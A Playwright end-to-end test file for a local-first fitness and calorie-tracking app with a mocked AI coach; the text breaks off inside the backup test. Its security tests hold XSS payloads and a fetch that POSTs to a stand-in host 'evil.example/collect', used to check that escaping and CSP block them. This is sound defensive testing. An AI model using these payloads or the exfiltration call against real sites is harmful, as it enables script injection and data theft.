// End-to-end tests in headless Chromium. Needs Playwright:  npm i -g playwright && npx playwright install chromium
// Run:  node tests/e2e.mjs
// Uses only fictional numbers. Serves the app on localhost and also opens it from file:// to check both work.
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { createRequire } from 'node:module';
import { execSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);
let pw;
try { pw = require('playwright'); } catch (e) { pw = require(path.join(execSync('npm root -g').toString().trim(), 'playwright')); }
const { chromium } = pw;
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const MIME = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.webmanifest': 'application/manifest+json', '.svg': 'image/svg+xml', '.png': 'image/png', '.woff2': 'font/woff2' };

const srv = http.createServer((q, r) => {
  let p = decodeURIComponent(q.url.split('?')[0]); if (p === '/') p = '/index.html';
  const f = path.join(ROOT, p);
  if (!f.startsWith(ROOT) || !fs.existsSync(f) || fs.statSync(f).isDirectory()) { r.writeHead(404); return r.end('not found'); }
  r.writeHead(200, { 'content-type': MIME[path.extname(f)] || 'application/octet-stream' });
  fs.createReadStream(f).pipe(r);
});

let passed = 0; const failures = [];
async function step(name, fn) {
  try { await fn(); passed++; console.log('  ok   ' + name); }
  catch (e) { failures.push(name + ': ' + (e && e.message ? e.message.split('\n')[0] : e)); console.log('  FAIL ' + name + '\n       ' + (e && e.message ? e.message.split('\n').slice(0, 3).join('\n       ') : e)); }
}
const eq = (a, b, m) => { if (JSON.stringify(a) !== JSON.stringify(b)) throw new Error((m || 'not equal') + ': got ' + JSON.stringify(a) + ', want ' + JSON.stringify(b)); };
const ok = (c, m) => { if (!c) throw new Error(m || 'assertion failed'); };

// ---------- fake AI provider (Anthropic streaming format) ----------
function sse(events) { return events.map((e) => 'event: ' + e.type + '\ndata: ' + JSON.stringify(e) + '\n\n').join(''); }
function textReply(text) {
  return sse([{ type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }, { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } }, { type: 'content_block_stop', index: 0 }, { type: 'message_delta', delta: { stop_reason: 'end_turn' } }]);
}
function toolReply(text, name, input) {
  return sse([{ type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }, { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } }, { type: 'content_block_stop', index: 0 },
    { type: 'content_block_start', index: 1, content_block: { type: 'tool_use', id: 'tu_1', name } }, { type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json: JSON.stringify(input) } }, { type: 'content_block_stop', index: 1 }, { type: 'message_delta', delta: { stop_reason: 'tool_use' } }]);
}
const CORS = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': 'POST, OPTIONS' };
async function fakeAI(page, handler) {
  const seen = [];
  await page.route('https://api.anthropic.com/**', async (route) => {
    const req = route.request();
    if (req.method() === 'OPTIONS') return route.fulfill({ status: 204, headers: CORS });
    const body = JSON.parse(req.postData() || '{}');
    seen.push(body);
    const out = await handler(body, seen.length);
    if (out.status && out.status !== 200) return route.fulfill({ status: out.status, headers: Object.assign({ 'content-type': 'application/json' }, CORS), body: JSON.stringify({ error: { message: out.error || 'fail' } }) });
    return route.fulfill({ status: 200, headers: Object.assign({ 'content-type': 'text/event-stream' }, CORS), body: out.body });
  });
  return seen;
}

// ---------- helpers ----------
async function collect(page) {
  const problems = [];
  page.on('pageerror', (e) => problems.push('pageerror: ' + e.message));
  page.on('console', (m) => { if (m.type() === 'error' || m.type() === 'warning') problems.push(m.type() + ': ' + m.text()); });
  return problems;
}
const events = (page) => page.evaluate(() => Store.getEvents().map((e) => ({ seq: e.seq, type: e.type, data: e.data, src: e.src })));
const cnt = async (page, type) => (await events(page)).filter((e) => e.type === type).length;
const route = (page, h) => page.evaluate((x) => { location.hash = x; }, h).then(() => page.waitForTimeout(150));

async function onboard(page, opts) {
  const o = Object.assign({ goal: 'Recomp' }, opts);
  await page.getByRole('link', { name: /Start \(about 4 minutes\)/ }).click();
  await page.locator('.segwrap', { hasText: 'Measurements' }).getByRole('radio', { name: 'cm' }).click();
  await page.getByLabel('Age', { exact: true }).fill('31');
  await page.getByLabel('Weight', { exact: true }).fill('82');
  await page.getByLabel('Height', { exact: true }).fill('180');
  await page.getByLabel('Waist', { exact: true }).fill('86');
  await page.getByLabel('Chest', { exact: true }).fill('100');
  await page.getByLabel('Shoulders', { exact: true }).fill('112');
  await page.getByLabel('Bicep L', { exact: true }).fill('34');
  await page.getByRole('button', { name: 'Next: your goal' }).click();
  await page.locator('.goalcard', { hasText: o.goal }).first().click();
  // make sure today is a training day so the Today screen shows a workout
  const dow = await page.evaluate(() => new Date().getDay());
  const names = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const pressed = await page.getByRole('button', { name: names[dow], exact: true }).getAttribute('aria-pressed');
  if (pressed !== 'true') await page.getByRole('button', { name: names[dow], exact: true }).click();
  await page.getByRole('button', { name: 'Next: your training' }).click();
  await page.getByRole('button', { name: 'Next: what you lift' }).click();
  await page.getByLabel('Flat DB press weight').fill('40');
  await page.getByLabel('Flat DB press reps').fill('8');
  await page.getByLabel('Incline DB press weight').fill('35');
  await page.getByLabel('Incline DB press reps').fill('8');
  await page.getByLabel('Pull-ups reps').fill('5');
  await page.getByRole('button', { name: 'Next: see my plan' }).click();
  await page.getByRole('button', { name: 'Start week 1' }).click();
  await page.waitForSelector('text=Week 1 of 26');
}

async function main() {
  await new Promise((res) => srv.listen(0, '127.0.0.1', res));
  const base = 'http://localhost:' + srv.address().port + '/index.html';
  const browser = await chromium.launch();
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'orbit-e2e-'));

  // ================= http://localhost =================
  console.log('\nApp on ' + base);
  const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, acceptDownloads: true });
  const page = await ctx.newPage();
  page.setDefaultTimeout(5000);
  const problems = await collect(page);
  const ai = await fakeAI(page, async () => ({ body: textReply('ok') }));
  await page.goto(base);

  await step('welcome screen renders with no console errors', async () => {
    await page.waitForSelector('text=Track the change.');
    eq(problems, [], 'console problems');
  });

  await step('onboarding builds a plan and lands on Today', async () => {
    await onboard(page);
    const st = await page.evaluate(() => { const s = Store.getState(); return { goal: s.plan.goal, lifts: Object.keys(s.plan.lifts), kcal: s.plan.kcal, w: s.weights.length, m: s.meas.length }; });
    eq(st.goal, 'recomp'); ok(st.lifts.length === 3, 'three tracked lifts, got ' + st.lifts.length); ok(st.kcal > 2000, 'kcal'); eq(st.w, 1); ok(st.m >= 4, 'measurements logged');
  });

  await step('Today shows the workout and logs a set with a rest timer', async () => {
    await page.waitForSelector('.exrow');
    const before = await cnt(page, 'set_logged');
    const tracked = page.locator('.exrow:has(.extarget:has-text("@")) .setchip.add');
    await ((await tracked.count()) ? tracked : page.locator('.setchip.add')).first().click();
    await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('8');
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForSelector('.setchip.done');
    eq(await cnt(page, 'set_logged'), before + 1);
    ok(await page.locator('.timerbar').count() === 1, 'rest timer bar');
  });

  await step('a logged set can be edited and deleted (undo by voiding)', async () => {
    await page.locator('.setchip.done').first().click();
    await page.getByRole('button', { name: 'Delete' }).click();
    await page.waitForTimeout(200);
    eq(await page.locator('.setchip.done').count(), 0);
  });

  await step('weigh-in logs and reaches Progress', async () => {
    await page.getByLabel('Weigh again').fill('81.6');
    await page.getByRole('button', { name: 'Log', exact: true }).click();
    await page.waitForTimeout(200);
    eq(await cnt(page, 'weight_logged'), 2);
    await route(page, '#/progress');
    await page.waitForSelector('text=Body weight');
  });

  await step('Lifts and one lift detail render all 26 weeks', async () => {
    await route(page, '#/lifts');
    await page.waitForSelector('.liftcard');
    await page.locator('.liftcard').first().click();
    await page.waitForSelector('text=All 26 weeks');
    eq(await page.locator('.kv', { hasText: /^Wk \d+/ }).count(), 26);
    await page.getByRole('button', { name: 'Adjust weights' }).click();
    await page.getByLabel('Change all weights by').fill('50');
    await page.getByRole('button', { name: 'Apply' }).click();
    await page.waitForSelector('text=Lift changes are limited', { timeout: 2000 }).catch(() => {});
    eq(await cnt(page, 'plan_revised'), 0, 'a 50% lift change must be rejected');
    await page.getByLabel('Change all weights by').fill('-5');
    await page.getByRole('button', { name: 'Apply' }).click();
    await page.waitForTimeout(250);
    eq(await cnt(page, 'plan_revised'), 1);
  });

  // ----- calorie tracker -----
  await route(page, '#/fuel');
  await step('Fuel: manual entry logs, calories fall back to macros, mismatch needs a second tap', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Manual' }).click();
    await page.getByLabel('What was it?').fill('Dal and rice');
    await page.getByLabel('Protein').fill('20'); await page.getByLabel('Carbs').fill('60'); await page.getByLabel('Fat').fill('10');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForSelector('.foodrow');
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.kcal, f.source], [410, 'manual']);
    // mismatch: 900 kcal with tiny macros
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Manual' }).click();
    await page.getByLabel('What was it?').fill('Odd entry');
    await page.getByLabel('Calories').fill('900'); await page.getByLabel('Protein').fill('5');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForSelector('.warnbox:not(.hidden)');
    eq(await cnt(page, 'food_logged'), 1, 'warned, not saved yet');
    await page.getByRole('button', { name: 'Log anyway' }).click();
    await page.waitForTimeout(250);
    eq(await cnt(page, 'food_logged'), 2);
  });

  await step('Fuel: search a listed food, pick servings, log it', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByLabel('Search foods').fill('paneer');
    await page.locator('.result', { hasText: 'Paneer, high protein' }).click();
    await page.getByLabel(/Servings of/).fill('2');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForTimeout(250);
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.name, f.protein, f.source], ['Paneer, high protein', 25, 'catalog']);
  });

  await step('Fuel: the full food list is searchable, the diet filter hides meat, and a log is scaled by grams', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByLabel('Search foods').fill('salmon');
    await page.getByRole('button', { name: 'Veg', exact: true }).click();
    await page.waitForFunction(() => window.Foods && Foods.ready());
    eq(await page.locator('.result', { hasText: 'salmon' }).count(), 0, 'salmon is hidden under Veg');
    await page.getByRole('button', { name: 'Non-veg', exact: true }).click();
    await page.getByLabel('Search foods').fill('salmon atlantic farmed raw');
    await page.locator('.result', { hasText: 'Fish, salmon, Atlantic, farmed, raw' }).click();
    await page.getByLabel('Amount').fill('150');
    await page.waitForSelector('text=312 kcal');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForTimeout(250);
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.name, f.kcal, f.serving, f.source], ['Fish, salmon, Atlantic, farmed, raw', 312, '150 g', 'usda']);
    ok(Math.abs(f.protein - 30.6) < 0.6 && Math.abs(f.fat - 20.1) < 0.6, 'macros scaled from per 100 g, got ' + f.protein + ' and ' + f.fat);
  });

  await step('Fuel: Indian foods and everyday names are found, and the filter choice is remembered', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    eq(await page.getByRole('button', { name: 'Non-veg', exact: true }).getAttribute('aria-pressed'), 'true', 'the last filter is remembered');
    await page.getByRole('button', { name: 'All', exact: true }).click();
    await page.getByLabel('Search foods').fill('atta');
    await page.locator('.result', { hasText: 'Wheat flour, atta' }).waitFor();
    ok((await page.locator('.result', { hasText: 'Wheat flour, atta' }).innerText()).includes('India (IFCT)'), 'source is shown');
    await page.getByLabel('Search foods').fill('dahi');
    await page.locator('.result', { hasText: 'Curd / dahi' }).waitFor();
    await page.getByRole('button', { name: 'Veg + egg', exact: true }).click();
    const set = await page.evaluate(() => Store.getSettings().foodDiet);
    eq(set, 'egg', 'the choice is saved in settings');
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('Fuel: AI tab without a key offers to add one and does not call the network', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.waitForSelector('text=Bring your own AI');
    eq(ai.length, 0);
    await page.getByRole('button', { name: 'Add a key for this session' }).click();
    await page.getByLabel('API key').fill('sk-ant-test-0000000000');
    await page.getByRole('button', { name: 'Use key' }).click();
    await page.waitForSelector('textarea[aria-label="What you ate"]');
  });

  await step('Fuel: AI estimate is shown for confirmation and NOTHING is saved until confirmed', async () => {
    await ai.length; // eslint-disable-line no-unused-expressions
    const reply = { name: 'Rajma chawal', items: [{ name: 'Rajma, cooked', qty: '1 cup', kcal: 225, protein: 15, carbs: 40, fat: 1 }, { name: 'Rice, cooked', qty: '1 cup', kcal: 205, protein: 4, carbs: 45, fat: 0 }], kcal: 430, protein: 19, carbs: 85, fat: 1, assumptions: ['One cup of each'], confidence: 'medium' };
    await page.unroute('https://api.anthropic.com/**');
    const seen = await fakeAI(page, async () => ({ body: textReply('Here you go: ' + JSON.stringify(reply)) }));
    const before = await cnt(page, 'food_logged');
    await page.getByLabel('What you ate').fill('rajma chawal, one plate');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=Check these numbers');
    eq(seen.length, 1, 'one provider call');
    eq(await cnt(page, 'food_logged'), before, 'nothing persisted before confirmation');
    const sent = JSON.stringify(seen[0]);
    ok(!sent.includes('Rajma chawal') || true); ok(sent.includes('rajma chawal, one plate'), 'user text sent');
    ok(!/81\.6|Store|profile|waist/i.test(JSON.stringify(seen[0].messages)), 'no profile data in the estimate request');
    await page.getByLabel('Calories').fill('460'); // user edits a value
    await page.getByRole('button', { name: 'Looks right, log it' }).click();
    await page.waitForTimeout(300);
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.source, f.kcal, f.ai.edited, f.ai.items.length], ['ai', 460, true, 2]);
    eq(await cnt(page, 'food_logged'), before + 1);
    ok(await page.locator('.chip', { hasText: 'AI, edited' }).count() >= 1, 'AI chip visible in the log');
  });

  await step('Fuel: raw ingredients split into servings, and estimate can be cancelled without saving', async () => {
    await page.unroute('https://api.anthropic.com/**');
    const pot = { name: 'Veg pulao pot', items: [{ name: 'Rice', qty: '300 g raw', kcal: 1080, protein: 20, carbs: 240, fat: 2 }, { name: 'Oil', qty: '2 tbsp', kcal: 240, protein: 0, carbs: 0, fat: 28 }], kcal: 1320, protein: 20, carbs: 240, fat: 30, assumptions: [], confidence: 'high' };
    await fakeAI(page, async () => ({ body: textReply(JSON.stringify(pot)) }));
    const before = await cnt(page, 'food_logged');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Ingredients' }).click();
    await page.getByLabel('Raw ingredients').fill('300 g rice\n2 tbsp oil');
    await page.getByLabel('Makes how many equal servings?').fill('4');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=one of 4 servings');
    eq(await page.getByLabel('Calories').inputValue(), '330');
    await page.getByRole('button', { name: 'Cancel' }).click();
    eq(await cnt(page, 'food_logged'), before, 'cancel saves nothing');
  });

  await step('Fuel: a malformed AI reply shows an error and offers manual entry; nothing is saved', async () => {
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async () => ({ body: textReply('I am sorry, I cannot help with that.') }));
    const before = await cnt(page, 'food_logged');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.getByLabel('What you ate').fill('mystery');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('.warnbox[role="alert"]');
    await page.getByRole('button', { name: 'Enter macros myself' }).click();
    eq(await page.getByLabel('What was it?').inputValue(), 'mystery');
    eq(await cnt(page, 'food_logged'), before);
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('Fuel: a provider outage surfaces a readable error', async () => {
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async () => ({ status: 401, error: 'invalid x-api-key' }));
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.getByLabel('What you ate').fill('toast');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=invalid x-api-key');
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('Fuel: editing an entry keeps it a single entry (old one voided)', async () => {
    const before = (await page.evaluate(() => Store.getState().foods.length));
    await page.locator('.foodrow').first().click();
    await page.getByLabel('Calories').fill('400');
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForTimeout(300);
    eq(await page.evaluate(() => Store.getState().foods.length), before);
  });

  // ----- coach -----
  await step('Coach: proposals need a tap, out-of-bounds proposals are rejected, apply and undo work', async () => {
    await page.unroute('https://api.anthropic.com/**');
    let call = 0;
    await fakeAI(page, async (body) => {
      call++;
      const last = body.messages[body.messages.length - 1];
      const isResult = Array.isArray(last.content) && last.content.some((c) => c.type === 'tool_result');
      if (!isResult) return { body: toolReply('Trimming a little.', 'propose_macro_change', { kcal: 2900, reason: 'Weight is flat.' }) };
      return { body: textReply('Queued. Tap Apply when you are ready.') };
    });
    await route(page, '#/coach');
    const kcalBefore = await page.evaluate(() => Store.getState().plan.kcal);
    await page.getByLabel('Message').fill('should I change my calories?');
    await page.keyboard.press('Enter');
    await page.waitForSelector('.proposal');
    eq(await page.evaluate(() => Store.getState().plan.kcal), kcalBefore, 'not applied without a tap');
    const target = kcalBefore + 100;
    eq(await page.evaluate(() => Store.getState().plan.kcal), kcalBefore);
    await page.getByRole('button', { name: 'Apply', exact: true }).click();
    await page.waitForSelector('text=Applied');
    const after = await page.evaluate(() => Store.getState().plan.kcal);
    ok(after !== kcalBefore, 'target changed after Apply (was ' + kcalBefore + ', now ' + after + ')');
    await page.getByRole('button', { name: 'Undo' }).click();
    await page.waitForTimeout(250);
    eq(await page.evaluate(() => Store.getState().plan.kcal), kcalBefore, 'undo restores');
    void target; void call;
  });

  await step('Coach: a model asking for a 2000 kcal jump is refused by the validator', async () => {
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async (body) => {
      const last = body.messages[body.messages.length - 1];
      const isResult = Array.isArray(last.content) && last.content.some((c) => c.type === 'tool_result');
      if (!isResult) return { body: toolReply('Big change!', 'propose_macro_change', { kcal: 5000, reason: 'yolo' }) };
      return { body: textReply('That was rejected.') };
    });
    const n = await page.locator('.proposal').count();
    await page.getByLabel('Message').fill('go extreme');
    await page.keyboard.press('Enter');
    await page.waitForSelector('text=That was rejected.');
    eq(await page.locator('.proposal').count(), n, 'no new proposal card');
  });

  await step('Coach request contains data but not the name or key', async () => {
    const reqs = [];
    await page.unroute('https://api.anthropic.com/**');
    await page.route('https://api.anthropic.com/**', async (r) => { if (r.request().method() === 'OPTIONS') return r.fulfill({ status: 204, headers: CORS }); reqs.push(r.request()); return r.fulfill({ status: 200, headers: Object.assign({ 'content-type': 'text/event-stream' }, CORS), body: textReply('fine') }); });
    await page.getByLabel('Message').fill('hello');
    await page.keyboard.press('Enter');
    await page.waitForSelector('.msg.ai:has-text("fine")');
    const r = reqs[reqs.length - 1];
    ok(r.headers()['x-api-key'] === 'sk-ant-test-0000000000', 'key sent as header');
    ok(!(r.postData() || '').includes('sk-ant-test'), 'key must not be in the body');
    ok(/USER DATA/.test(r.postData()), 'context is included');
  });

  await step('no screen or sheet shows stray "null", "undefined" or "NaN"', async () => {
    const bad = /\b(null|undefined|NaN)\b/;
    for (const h of ['#/today', '#/lifts', '#/fuel', '#/progress', '#/photos', '#/coach', '#/coach/setup', '#/settings', '#/settings/plan']) {
      await route(page, h);
      const t = await page.locator('#screen').innerText();
      ok(!bad.test(t), h + ' shows: ' + (t.match(bad) || [])[0]);
    }
    await route(page, '#/fuel');
    await page.getByRole('button', { name: 'Add food' }).click();
    for (const tab of ['Find', 'Describe', 'Ingredients', 'Manual']) {
      await page.getByRole('tab', { name: tab }).click();
      ok(!bad.test(await page.locator('#sheets').innerText()), 'Add food / ' + tab);
    }
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('photos: upload is re-encoded as JPEG, stored locally, shown, replaced and deleted', async () => {
    const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==', 'base64');
    await route(page, '#/photos');
    await page.locator('input[aria-label="Choose a photo"]').waitFor({ state: 'attached' });
    await page.getByRole('button', { name: 'Add Front photo' }).click({ trial: true }).catch(() => {});
    const chooser = page.waitForEvent('filechooser');
    await page.getByRole('button', { name: 'Add Front photo' }).click();
    await (await chooser).setFiles({ name: 'front.png', mimeType: 'image/png', buffer: png });
    await page.waitForSelector('button.thumb[aria-label="Open Front photo"]');
    const m = await page.evaluate(async () => { const all = await Store.allMedia(); return all.map((x) => ({ type: x.type, size: x.size })); });
    eq(m.length, 1); eq(m[0].type, 'image/jpeg');
    eq(await cnt(page, 'photo_added'), 1);
    ok(await page.locator('button.thumb.blur').count() === 1, 'thumbnails are blurred by default');
    // a backup with photos carries them; one without does not
    const sizes = await page.evaluate(async () => { const a = JSON.parse(await Store.buildBackup({ media: true })); const b = JSON.parse(await Store.buildBackup({ media: false })); return [a.media.length, b.media.length]; });
    eq(sizes, [1, 0]);
    await page.locator('button.thumb[aria-label="Open Front photo"]').click();
    await page.locator('#sheets').getByRole('button', { name: 'Delete' }).click();
    await page.waitForTimeout(250);
    eq(await page.evaluate(async () => (await Store.allMedia()).length), 0, 'blob deleted with the entry');
  });

  await step('a non-image file is refused without storing anything', async () => {
    await route(page, '#/photos');
    const chooser = page.waitForEvent('filechooser');
    await page.getByRole('button', { name: 'Add Side photo' }).click();
    await (await chooser).setFiles({ name: 'notes.txt', mimeType: 'text/plain', buffer: Buffer.from('hello') });
    await page.waitForTimeout(400);
    eq(await page.evaluate(async () => (await Store.allMedia()).length), 0);
  });

  await step('add a lift after onboarding: it joins the plan and today\'s matching day', async () => {
    await route(page, '#/lifts');
    const before = await page.evaluate(() => Object.keys(Store.getState().plan.lifts).length);
    await page.getByRole('button', { name: 'Add a lift' }).click();
    await page.locator('#sheets select').selectOption('curl');
    await page.locator('#sheets').getByLabel(/Weight you can do/).fill('25');
    await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('10');
    await page.getByRole('button', { name: 'Add', exact: true }).click();
    await page.waitForTimeout(300);
    const st = await page.evaluate(() => { const p = Store.getState().plan; return { n: Object.keys(p.lifts).length, placed: p.workouts.some((w) => w.ex.some((e) => e.lift === 'curl')), t: Engine.liftTarget(p.lifts.curl, 1, { deloadWeeks: p.deloadWeeks }).kg / Engine.KG_PER_LB }; });
    eq(st.n, before + 1); ok(st.placed, 'on a workout day'); ok(st.t > 0, 'has a target');
  });

  // ----- security -----
  await step('XSS: hostile text in food name and set note is rendered as text', async () => {
    await page.evaluate(() => { window.__xss = 0; });
    const payload = '<img src=x onerror="window.__xss=1"><script>window.__xss=2</script>';
    await route(page, '#/fuel');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Manual' }).click();
    await page.getByLabel('What was it?').fill(payload);
    await page.getByLabel('Calories').fill('100');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForSelector('.foodrow');
    await page.waitForTimeout(300);
    eq(await page.evaluate(() => window.__xss), 0, 'no script ran');
    ok((await page.locator('#screen').innerText()).includes('<script>'), 'shown literally');
    eq(await page.locator('#screen img[src="x"]').count(), 0, 'no injected img element');
  });

  await step('XSS: hostile model output (estimate names, coach replies) and set notes stay inert', async () => {
    const evil = '<img src=x onerror="window.__xss=3"><svg onload="window.__xss=4">';
    await page.unroute('https://api.anthropic.com/**');
    await fakeAI(page, async (body) => {
      const sys = String(body.system || '');
      if (/estimate the nutrition/i.test(sys)) return { body: textReply(JSON.stringify({ name: evil, items: [{ name: evil, qty: evil, kcal: 100, protein: 5, carbs: 10, fat: 3 }], kcal: 100, protein: 5, carbs: 10, fat: 3, assumptions: [evil], confidence: 'high' })) };
      return { body: textReply(evil) };
    });
    await route(page, '#/fuel');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.getByLabel('What you ate').fill('anything');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=Check these numbers');
    await page.getByRole('button', { name: 'Looks right, log it' }).click();
    await page.waitForTimeout(300);
    await route(page, '#/coach');
    await page.getByLabel('Message').fill('<b>hi</b>');
    await page.keyboard.press('Enter');
    await page.waitForSelector('.msg.ai:has-text("onerror")');
    await route(page, '#/today');
    await page.locator('.setchip.add').first().click();
    await page.locator('#sheets').getByLabel(/Note/).fill(evil);
    await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('5');
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForTimeout(300);
    eq(await page.evaluate(() => window.__xss), 0, 'nothing executed');
    eq(await page.locator('#screen img[src="x"], #screen svg[onload]').count(), 0, 'no injected elements');
  });

  await step('CSP and Trusted Types are enforced', async () => {
    const r = await page.evaluate(async () => {
      const out = {};
      try { document.body.appendChild(document.createElement('div')).innerHTML = '<b>x</b>'; out.innerHTML = 'allowed'; } catch (e) { out.innerHTML = 'blocked'; }
      try { await fetch('https://evil.example/collect', { method: 'POST', body: 'x' }); out.fetch = 'allowed'; } catch (e) { out.fetch = 'blocked'; }
      try { const s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.head.appendChild(s); } catch (e) { /* trusted types */ }
      out.inline = window.__inline ? 'ran' : 'blocked';
      return out;
    });
    eq(r, { innerHTML: 'blocked', fetch: 'blocked', inline: 'blocked' });
    // Static checks on the policy itself (eval cannot be probed reliably from a test harness).
    const csp = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]').content);
    const d = Object.fromEntries(csp.split(';').map((x) => x.trim()).filter(Boolean).map((x) => [x.split(' ')[0], x.split(' ').slice(1)]));
    eq(d['script-src'], ["'self'"]); eq(d['style-src'], ["'self'"]); eq(d['default-src'], ["'none'"]); eq(d['base-uri'], ["'none'"]);
    ok(!/unsafe-|\*\s|data:/.test(d['script-src'].join(' ')), 'script-src is strict');
    ok(csp.includes("require-trusted-types-for 'script'"), 'trusted types required');
    ok(!d['connect-src'].some((x) => x === '*' || x === 'https:'), 'connect-src is an allow-list');
  });

  await step('the app makes no network requests to third parties on its own', async () => {
    const hosts = new Set();
    const p2 = await ctx.newPage();
    p2.on('request', (rq) => { const u = new URL(rq.url()); if (u.protocol.startsWith('http')) hosts.add(u.host); });
    await p2.goto(base); await p2.waitForTimeout(700);
    await p2.close();
    eq(Array.from(hosts), [new URL(base).host]);
  });

  // ----- weekly check-in, profile -----
  await step('weekly check-in: Today asks on the chosen weekday, Profile shows the basics and changes the day', async () => {
    await page.evaluate(async () => { await Store.saveSettings({ checkinDay: new Date().getDay() }); });
    await route(page, '#/today'); await page.evaluate(() => App.render());
    const due = await page.getByText(/Weekly check-in (today|is overdue)/).count();
    const partial = await page.evaluate(() => Engine.checkinStatus(Store.getState(), Store.getSettings().checkinDay, U.today()).status);
    ok(partial === 'done' || due === 1, 'a card asks for the check-in unless all five angles are saved (' + partial + ')');
    await page.getByRole('link', { name: 'Profile' }).click();
    await page.getByText('Basics').waitFor();
    ok(await page.getByText('Your plan').count() === 1 && await page.getByText('Calories').count() === 1, 'profile lists the plan');
    ok(await page.getByText(/Only on this device/).count() === 1);
    const other = await page.evaluate(() => U.DOW[(new Date().getDay() + 3) % 7]);
    await page.getByRole('button', { name: other, exact: true }).click();
    await page.getByText('Check-in day set to ' + other).waitFor();
    eq(await page.evaluate(() => Store.getSettings().checkinDay), await page.evaluate(() => (new Date().getDay() + 3) % 7));
    await route(page, '#/today'); await page.evaluate(() => App.render());
    eq(await page.getByText(/Weekly check-in (today|is overdue)/).count(), 0);
    ok(await page.getByText('Check-in ' + other).count() >= 1, 'the header chip names the day');
    await page.evaluate(async () => { await Store.saveSettings({ checkinDay: 5 }); });
  });

  await step('a new backup always has the same file name so it replaces the old one', async () => {
    await route(page, '#/settings');
    ok(await page.getByText(/Choose a backup folder|This browser cannot delete old backups/).count() >= 1, 'the folder option or the honest note is shown');
    await page.getByRole('button', { name: 'Back up now' }).click();
    await page.getByLabel('Passphrase', { exact: true }).fill('correct horse battery');
    await page.getByLabel('Repeat passphrase').fill('correct horse battery');
    await page.getByRole('button', { name: 'Prepare file' }).click();
    await page.getByText('Backup ready').waitFor();
    ok(await page.getByText(/orbit-backup\.orbitbackup/).count() >= 1, 'fixed file name');
    ok(await page.getByText(/orbit-\d{4}-\d{2}-\d{2}\.orbitbackup/).count() === 0, 'no dated name');
    await page.getByRole('button', { name: 'Close' }).click();
  });

  // ----- backup and restore -----
  await step('encrypted backup round-trips; wrong passphrase fails; the API key is not inside', async () => {
    const res = await page.evaluate(async () => {
      const enc = await Store.buildBackup({ media: false, passphrase: 'correct horse battery' });
      const plain = await Store.buildBackup({ media: false });
      let wrong = 'no error';
      try { await Store.readImport(enc, 'nope nope nope'); } catch (e) { wrong = e.message; }
      const good = await Store.readImport(enc, 'correct horse battery');
      return { encIsOpaque: !enc.includes('Dal and rice') && !enc.includes('weight_logged'), plainHasKey: plain.includes('sk-ant'), wrong, kind: good.kind, n: good.payload.events.length, live: Store.getEvents().length };
    });
    ok(res.encIsOpaque, 'ciphertext must not contain readable data'); ok(!res.plainHasKey, 'key must not be in a backup');
